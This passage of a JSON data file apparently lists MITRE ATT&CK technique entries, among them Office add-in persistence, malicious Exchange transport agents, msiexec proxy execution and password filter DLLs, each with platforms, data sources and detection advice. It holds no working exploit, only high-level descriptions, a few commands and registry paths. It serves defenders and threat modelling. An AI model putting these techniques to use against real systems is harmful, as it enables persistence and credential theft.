      "description": "Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)\n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. ",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1137.006",
      "stix_id": "attack-pattern--34f1d81d-fe88-4f97-bd3b-a3164536255d",
      "created": "2019-11-07T19:52:52.801000+00:00",
      "modified": "2025-04-15T21:45:27.400000+00:00",
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "File: File Modification",
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Creation",
        "Process: Process Creation",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.(Citation: GlobalDotName Jun 2019)(Citation: MRWLabs Office Persistence Add-ins)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior"
    },
    "T1505.002": {
      "id": "T1505.002",
      "name": "Transport Agent",
      "description": "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. ",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1505.002",
      "stix_id": "attack-pattern--35187df2-31ed-43b6-a1f5-2f1d3d58d3f1",
      "created": "2019-12-12T15:08:20.972000+00:00",
      "modified": "2025-04-25T14:46:19.364000+00:00",
      "platforms": [
        "Linux",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components."
    },
    "T1082": {
      "id": "T1082",
      "name": "System Information Discovery",
      "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get`, `system version get`, and `storage filesystem list` (to list storage volumes).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)\n\n[System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques) ",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1082",
      "stix_id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
      "created": "2017-05-31T21:31:04.307000+00:00",
      "modified": "2025-04-15T19:58:21.308000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather  detailed system information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use  commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations."
    },
    "T1071": {
      "id": "T1071",
      "name": "Application Layer Protocol",
      "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.(Citation: Mandiant APT29 Eye Spy Email Nov 22) ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1071",
      "stix_id": "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6",
      "created": "2017-05-31T21:30:56.776000+00:00",
      "modified": "2025-04-15T19:58:21.401000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)"
    },
    "T1574.014": {
      "id": "T1574.014",
      "name": "AppDomainManager",
      "description": "Adversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code.(Citation: Microsoft App Domains) \n\nKnown as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.(Citation: PenTestLabs AppDomainManagerInject)(Citation: PwC Yellow Liderc)(Citation: Rapid7 AppDomain Manager Injection)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.014",
      "stix_id": "attack-pattern--356662f7-e315-4759-86c9-6214e2a50ff8",
      "created": "2024-03-28T15:36:34.141000+00:00",
      "modified": "2025-04-15T21:48:08.401000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "File: File Creation",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1074.002": {
      "id": "T1074.002",
      "name": "Remote Data Staging",
      "description": "Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1074.002",
      "stix_id": "attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0",
      "created": "2020-03-13T21:14:58.206000+00:00",
      "modified": "2025-04-15T19:58:21.613000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Command: Command Execution",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1098.006": {
      "id": "T1098.006",
      "name": "Additional Container Cluster Roles",
      "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1098.006",
      "stix_id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
      "created": "2023-07-14T14:01:50.806000+00:00",
      "modified": "2025-04-15T21:46:31.661000+00:00",
      "platforms": [
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1053": {
      "id": "T1053",
      "name": "Scheduled Task/Job",
      "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1053",
      "stix_id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
      "created": "2017-05-31T21:30:46.977000+00:00",
      "modified": "2025-04-15T21:41:11.473000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "Containers",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Scheduled Job: Scheduled Job Creation",
        "File: File Creation",
        "Process: Process Creation",
        "Container: Container Creation",
        "Command: Command Execution",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
    },
    "T1218.007": {
      "id": "T1218.007",
      "name": "Msiexec",
      "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.007",
      "stix_id": "attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336",
      "created": "2020-01-24T14:38:49.266000+00:00",
      "modified": "2025-04-16T20:37:16.547000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Network Traffic: Network Connection Creation",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed."
    },
    "T1590.003": {
      "id": "T1590.003",
      "name": "Network Trust Dependencies",
      "description": "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1590.003",
      "stix_id": "attack-pattern--36aa137f-5166-41f8-b2f0-a4cfa1b4133e",
      "created": "2020-10-02T15:47:59.457000+00:00",
      "modified": "2025-04-15T22:53:01.571000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1498.002": {
      "id": "T1498.002",
      "name": "Reflection Amplification",
      "description": "Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1498.002",
      "stix_id": "attack-pattern--36b2a1d7-e09e-49bf-b45e-477076c2ec01",
      "created": "2020-03-02T20:08:03.691000+00:00",
      "modified": "2025-04-15T22:59:22.782000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Sensor Health: Host Status",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Detection of reflection amplification can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a reflection amplification DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation."
    },
    "T1556.002": {
      "id": "T1556.002",
      "name": "Password Filter DLL",
      "description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1556.002",
      "stix_id": "attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42",
      "created": "2020-02-11T19:05:45.829000+00:00",
      "modified": "2025-04-15T22:56:08.743000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "File: File Creation",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference.\n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)"
    },
    "T1505.005": {
      "id": "T1505.005",
      "name": "Terminal Services DLL",
      "description": "Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)\n\n[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a \"generic\" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\\System32\\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`.\n\nAdversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1505.005",
      "stix_id": "attack-pattern--379809f6-2fac-42c1-bd2e-e9dee70b27f8",
      "created": "2022-03-28T15:34:44.590000+00:00",
      "modified": "2025-04-15T23:15:45.110000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Command: Command Execution",
        "File: File Modification",
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for changes to Registry keys associated with <code>ServiceDll</code> and other subkey values under <code>HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\</code>.\n\nMonitor unexpected changes and/or interactions with <code>termsrv.dll</code>, which is typically stored in <code>%SystemRoot%\\System32\\</code>.\n\nMonitor commands as well as  processes and arguments for potential adversary actions to modify Registry values (ex: <code>reg.exe</code>) or modify/replace the legitimate <code>termsrv.dll</code>.\n\nMonitor module loads by the Terminal Services process (ex: <code>svchost.exe -k termsvcs</code>) for unexpected DLLs (the default is <code>%SystemRoot%\\System32\\termsrv.dll</code>, though an adversary could also use [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005) on a malicious payload)."
    },
    "T1059.002": {
      "id": "T1059.002",
      "name": "AppleScript",
      "description": "Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)\n\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s\u00a0<code>NSAppleScript</code>\u00a0or\u00a0<code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.002",
      "stix_id": "attack-pattern--37b11151-1776-4f8f-b328-30939fbf2ceb",
      "created": "2020-03-09T14:07:54.329000+00:00",
      "modified": "2025-04-15T19:58:22.484000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for execution of AppleScript through <code>osascript</code> and usage of the <code>NSAppleScript</code> and <code>OSAScript</code> APIs that may be related to other suspicious behavior occurring on the system. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    },
    "T1176": {
      "id": "T1176",
      "name": "Software Extensions",
      "description": "Adversaries may abuse software extensions to establish persistent access to victim systems. Software extensions are modular components that enhance or customize the functionality of software applications, including web browsers, Integrated Development Environments (IDEs), and other platforms.(Citation: Chrome Extension C2 Malware)(Citation: Abramovsky VSCode Security) Extensions are typically installed via official marketplaces, app stores, or manually loaded by users, and they often inherit the permissions and access levels of the host application. \n\n  \nMalicious extensions can be introduced through various methods, including social engineering, compromised marketplaces, or direct installation by users or by adversaries who have already gained access to a system. Malicious extensions can be named similarly or identically to benign extensions in marketplaces. Security mechanisms in extension marketplaces may be insufficient to detect malicious components, allowing adversaries to bypass automated scanners or exploit trust established during the installation process. Adversaries may also abuse benign extensions to achieve their objectives, such as using legitimate functionality to tunnel data or bypass security controls. \n\nThe modular nature of extensions and their integration with host applications make them an attractive target for adversaries seeking to exploit trusted software ecosystems. Detection can be challenging due to the inherent trust placed in extensions during installation and their ability to blend into normal application workflows. ",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1176",
      "stix_id": "attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-15T19:58:22.784000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Network Traffic: Network Traffic Flow",
        "Command: Command Execution",
        "File: File Creation",
        "Network Traffic: Network Connection Creation",
        "Windows Registry: Windows Registry Key Creation"
      ],
      "defense_bypassed": [],
      "detection": "Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.\n\nMonitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.\n\nOn macOS, monitor the command line for usage of the profiles tool, such as <code>profiles install -type=configuration</code>. Additionally, all installed extensions maintain a <code>plist</code> file in the <code>/Library/Managed Preferences/username/</code> directory. Ensure all listed files are in alignment with approved extensions.(Citation: xorrior chrome extensions macOS)"
    },
    "T1499.002": {
      "id": "T1499.002",
      "name": "Service Exhaustion Flood",
      "description": "Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1499.002",
      "stix_id": "attack-pattern--38eb0c22-6caf-46ce-8869-5964bd735858",
      "created": "2020-02-20T15:31:43.613000+00:00",
